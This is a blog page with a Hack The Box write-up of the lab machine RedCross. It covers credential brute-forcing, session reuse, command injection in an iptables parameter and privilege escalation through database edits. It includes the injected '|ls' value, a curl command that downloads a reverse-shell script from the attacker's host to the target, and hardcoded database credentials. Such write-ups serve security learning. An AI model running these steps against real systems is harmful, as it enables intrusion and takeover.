<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - RedCross - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-RedCross"><a href="#Hack-The-Box-RedCross" class="headerlink" title="Hack The Box - RedCross"></a>Hack The Box - RedCross</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as <code>www-data</code> , then escalate to root. The second way is to exploit a vulnerable <code>smtp</code> server called <code>Haraka</code> to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is <code>10.10.10.113</code> I added it to <code>/etc/hosts</code> as <code>redcross.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/redcross/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC redcross.htb</code><br><img src="/images/hackthebox/redcross/1.png" alt=""><br>Port 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http.</p>
<h2 id="HTTP-Initial-Enumeration"><a href="#HTTP-Initial-Enumeration" class="headerlink" title="HTTP Initial Enumeration"></a>HTTP Initial Enumeration</h2><p>By going to <code>http://redcross.htb</code> it redirects us to <code>https://intra.redcross.htb</code><br><img src="/images/hackthebox/redcross/2.png" alt=""><br>I added <code>intra.redcross.htb</code> to <code>/etc/hosts</code> next to the ip of the box which is <code>10.10.10.113</code><br><img src="/images/hackthebox/redcross/3.png" alt=""><br>Let’s go to <code>intra.redcross.htb</code> again :<br><img src="/images/hackthebox/redcross/4.png" alt=""><br>Before doing anything I wanted to see if there are any other subdomains , so I used <code>wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt" target="_blank" rel="noopener">subdomains-top1mil-5000.txt</a> from seclists :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https:&#x2F;&#x2F;redcross.htb</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/redcross/5.png" alt=""><br>Responses for non-existing subdomains are 28 words so I stopped the scan to add <code>--hw 28</code> to filter these responses :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https:&#x2F;&#x2F;redcross.htb</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/redcross/6.png" alt=""><br>And we got <code>admin.redcross.htb</code> , So I added it to <code>/etc/hosts</code> :<br><img src="/images/hackthebox/redcross/7.png" alt=""><br>Note : to enumerate every subdoamin there has to be an entry for that subdomain in <code>/etc/hosts</code> that points to the ip of the box , that’s why I added the <code>HOST</code> HTTP header (<code>-H &quot;HOST:FUZZ.redcross.htb&quot;</code>) , it solves the problem.<br>Now let’s go to <code>admin.redcross.htb</code> and see what’s there :<br><img src="/images/hackthebox/redcross/8.png" alt=""><br>It asks for login , we will get into this later but let’s go back to <code>intra.redcross.htb</code> and see what can we do from there.<br><img src="/images/hackthebox/redcross/4.png" alt=""><br>We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with <code>burp</code> to see the parameters :<br><img src="/images/hackthebox/redcross/9.png" alt=""><br>Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like <code>admin:admin</code>, <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt" target="_blank" rel="noopener">top-usernames-shortlist.txt</a> from seclists :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hh 11 -u &quot;https:&#x2F;&#x2F;intra.redcross.htb&#x2F;pages&#x2F;actions.php&quot; -X POST -d &quot;user&#x3D;FUZZ&amp;pass&#x3D;FUZZ&amp;action&#x3D;login&quot; -w top-usernames-shortlist.txt</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/redcross/10.png" alt=""><br><code>guest:guest</code> gave us a different response. Let’s try it :<br><img src="/images/hackthebox/redcross/11.png" alt=""><br>And it worked. And we see this message :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From: admin (uid 1)	To: guest (uid 5)</span><br><span class="line"></span><br><span class="line">You&#39;re granted with a low privilege access while we&#39;re processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.</span><br></pre></td></tr></table></figure>


<h2 id="Broken-Session-Management-Admin-Panel"><a href="#Broken-Session-Management-Admin-Panel" class="headerlink" title="Broken Session Management , Admin Panel"></a>Broken Session Management , Admin Panel</h2><p>After some enumeration I found that after being authenticated as <code>guest</code> on <code>intra.redcross.htb</code> you can use the session id on <code>admin.redcross.htb</code> and it will work :<br><img src="/images/hackthebox/redcross/12.png" alt=""><br><img src="/images/hackthebox/redcross/13.png" alt=""><br><img src="/images/hackthebox/redcross/14.png" alt=""><br>Now we have access to the admin panel , there are two areas : <code>User Management</code> and <code>Network Access</code><br><code>User Management</code> :<br><img src="/images/hackthebox/redcross/15.png" alt=""><br>Can we really add users ? Let’s try <code>test</code> :<br><img src="/images/hackthebox/redcross/16.png" alt=""><br><img src="/images/hackthebox/redcross/17.png" alt=""><br>Nice it gave us the credentials , let’s try ssh :<br><img src="/images/hackthebox/redcross/18.png" alt=""><br>And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at <code>/home</code> :<br><img src="/images/hackthebox/redcross/19.png" alt=""><br><code>interface_data</code> and <code>public</code> ? Last thing I checked was <code>/etc/passwd</code> to know any possible user :<br><img src="/images/hackthebox/redcross/20.png" alt=""><br>There’s a user called <code>penelope</code> , but no <code>/home</code> directory for <code>penelope</code>. So I gave up on this and looked at <code>Network Access</code> :<br><img src="/images/hackthebox/redcross/21.png" alt=""><br>I added my ip address to the whitelist:<br><img src="/images/hackthebox/redcross/22.png" alt=""><br>Then I scanned the box with nmap again to see if some new ports show up :<br><img src="/images/hackthebox/redcross/59.png" alt=""><br><img src="/images/hackthebox/redcross/60.png" alt=""><br>there’s ftp on port 21 (anonymous login not allowed), <code>postgresql SQL database</code> on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first.</p>
<h2 id="RCE-on-admin-redcross-htb-Reverse-Shell-as-www-data"><a href="#RCE-on-admin-redcross-htb-Reverse-Shell-as-www-data" class="headerlink" title="RCE on admin.redcross.htb , Reverse Shell as www-data"></a>RCE on <code>admin.redcross.htb</code> , Reverse Shell as <code>www-data</code></h2><p>On the <code>Network Access</code> Section you can add and remove ips from the whitelist , I added a random ip , let’s say <code>11.11.11.11</code> and intercepted the two requests with <code>burp</code> :<br><img src="/images/hackthebox/redcross/23.png" alt=""><br>Allow request :<br><img src="/images/hackthebox/redcross/24.png" alt=""><br>Response :<br><img src="/images/hackthebox/redcross/25.png" alt=""><br>Deny request :<br><img src="/images/hackthebox/redcross/26.png" alt=""><br>Response :<br><img src="/images/hackthebox/redcross/27.png" alt=""><br>We notice that it’s saying <code>Executing iptables</code> , so the ip we provide will be a part of a system command. I added <code>|ls</code> to the ip parameter in the deny request and got this response :<br><img src="/images/hackthebox/redcross/28.png" alt=""><br><img src="/images/hackthebox/redcross/29.png" alt=""><br>Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it <code>shell.sh</code> :<br><img src="/images/hackthebox/redcross/30.png" alt=""><br>Then I hosted it on a python simple HTTP server , and downloaded it on the box : <code>curl http://10.10.xx.xx/shell.sh &gt; /tmp/shell.sh</code><br><img src="/images/hackthebox/redcross/31.png" alt=""><br>Python Server :<br><img src="/images/hackthebox/redcross/32.png" alt=""><br>Let’s verify that the shell is on the box :<br><img src="/images/hackthebox/redcross/33.png" alt=""><br><img src="/images/hackthebox/redcross/34.png" alt=""><br>Nice let’s execute :<br><code>bash /tmp/shell.sh</code><br><img src="/images/hackthebox/redcross/35.png" alt=""><br><img src="/images/hackthebox/redcross/36.png" alt=""><br>We got a shell as <code>www-data</code> :<br><img src="/images/hackthebox/redcross/37.png" alt=""><br>And we see in <code>/home</code> a directory for <code>penelope</code> , but we can’t read the user flag.<br><img src="/images/hackthebox/redcross/38.png" alt=""></p>
<h2 id="Hardcoded-PostgreSQL-Database-Credentials-Privilege-Escalation-to-root"><a href="#Hardcoded-PostgreSQL-Database-Credentials-Privilege-Escalation-to-root" class="headerlink" title="Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root"></a>Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root</h2><p>In the root directory of the web application , there’s an interseting <code>php</code> file called <code>actions.php</code>. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called <code>unixusrmgr</code> :<br><img src="/images/hackthebox/redcross/40.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($action===<span class="string">'del'</span>)&#123;</span><br><span class="line">        header(<span class="string">'refresh:1;url=/?page=users'</span>);</span><br><span class="line">        $uid=$_POST[<span class="string">'uid'</span>];</span><br><span class="line">        $dbconn = pg_connect(<span class="string">"host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;"</span>);</span><br><span class="line">        $result = pg_prepare($dbconn, <span class="string">"q1"</span>, <span class="string">"delete from passwd_table where uid = $1"</span>);</span><br><span class="line">        $result = pg_execute($dbconn, <span class="string">"q1"</span>, <span class="keyword">array</span>($uid));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"User account deleted"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We knew earlier that the database is <code>PostgreSQL</code> , let’s connect :<br>Some Cheatcheets for <code>PostgreSQL</code> :<br><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546" target="_blank" rel="noopener">Github</a><br><a href="http://www.postgresqltutorial.com/postgresql-cheat-sheet/" target="_blank" rel="noopener">postgresqltutorial.com</a><br><code>psql -h 127.0.0.1 -d unix -U unixusrmgr</code><br><img src="/images/hackthebox/redcross/41.png" alt=""><br><code>\dt</code> to list the tables :<br><img src="/images/hackthebox/redcross/42.png" alt=""><br>I did <code>select * from passwd_table;</code> and got some users with their password hashes and other info , so I went back to the admin panel and added a user called <code>rick</code> :<br><img src="/images/hackthebox/redcross/43.png" alt=""><br>Then I did <code>select * from passwd_table;</code> again :<br><img src="/images/hackthebox/redcross/44.png" alt=""><br>We notice that the <code>homedir</code> is set to <code>/var/jail/home</code> that’s why we can’t access the actual host with created users. Also the <code>gid</code> is set to <code>1001</code>. Let’s set that to <code>0</code> (root) :<br><code>update passwd_table set gid=0 where gid=1001;</code><br><img src="/images/hackthebox/redcross/45.png" alt=""><br>Now the <code>gid</code> is <code>0</code> :<br><img src="/images/hackthebox/redcross/46.png" alt=""><br>Let’s also change the <code>homedir</code> :<br><code>update passwd_table set homedir=&#39;/home&#39; where homedir=&#39;/var/jail/home&#39;;</code><br><img src="/images/hackthebox/redcross/47.png" alt=""><br><img src="/images/hackthebox/redcross/48.png" alt=""><br>Let’s login with ssh again :<br><img src="/images/hackthebox/redcross/49.png" alt=""><br>by checking our <code>gid</code> :<br><img src="/images/hackthebox/redcross/50.png" alt=""><br>It’s <code>root</code> , we still can’t read the flags :<br><img src="/images/hackthebox/redcross/51.png" alt=""><br>We can’t also <code>sudo</code> :<br><img src="/images/hackthebox/redcross/52.png" alt=""><br>Weird , I checked <code>/etc/sudoers</code> and saw this line :<br><img src="/images/hackthebox/redcross/53.png" alt=""><br>If we got the <code>gid</code> of the group <code>sudo</code> , we will be able to run sudo.<br><code>cat /etc/group | grep sudo</code><br><img src="/images/hackthebox/redcross/54.png" alt=""><br>The <code>gid</code> is <code>27</code> , let’s return to the database and change our <code>gid</code> from <code>0</code> to <code>27</code> :<br><code>update passwd_table set gid=27 where gid=0;</code><br><img src="/images/hackthebox/redcross/55.png" alt=""></p>
<p><code>select * from passwd_table;</code><br><img src="/images/hackthebox/redcross/56.png" alt=""><br>Great , let’s terminate our ssh connection and login again. We are now a member of <code>sudo</code> and we can run <code>sudo</code> , so <code>sudo su</code> will give us a root shell.<br><img src="/images/hackthebox/redcross/57.png" alt=""><br>Let’s read the user flag :<br><img src="/images/hackthebox/redcross/58.png" alt=""><br>Before reading the root flag let’s see how can we actually get a user shell as <code>penelope</code></p>
<h2 id="Vulnerable-SMTP-Server-Haraka"><a href="#Vulnerable-SMTP-Server-Haraka" class="headerlink" title="Vulnerable SMTP Server (Haraka)"></a>Vulnerable SMTP Server (Haraka)</h2><p>Back to the admin panel , after whitelisting the ip and doing a second nmap scan :<br><img src="/images/hackthebox/redcross/59.png" alt=""><br><img src="/images/hackthebox/redcross/60.png" alt=""><br>Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, <code>nc</code> , <code>telnet</code> , <code>ftp</code> etc…<br>Fortunately <code>ftp</code> gave me this banner :<br><img src="/images/hackthebox/redcross/61.png" alt=""><br>That version of the <code>SMTP</code> server is vulnerable to a command injection and there’s a metasploit module for it :<br><img src="/images/hackthebox/redcross/62.png" alt=""><br><img src="/images/hackthebox/redcross/63.png" alt=""><br>That’s how to get a shell on the box without the RCE in the web application.<br>We can get a shell by typing <code>shell</code> , and we are <code>penelope</code> so we can read the user flag :<br><img src="/images/hackthebox/redcross/64.png" alt=""><br>After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag :<br><img src="/images/hackthebox/redcross/65.png" alt=""><br>And we owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/vault/">Hack The Box - Vault</a><br>Next Hack The Box write-up : <a href="/hack-the-box/teacher/">Hack The Box - Teacher</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-04-13</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
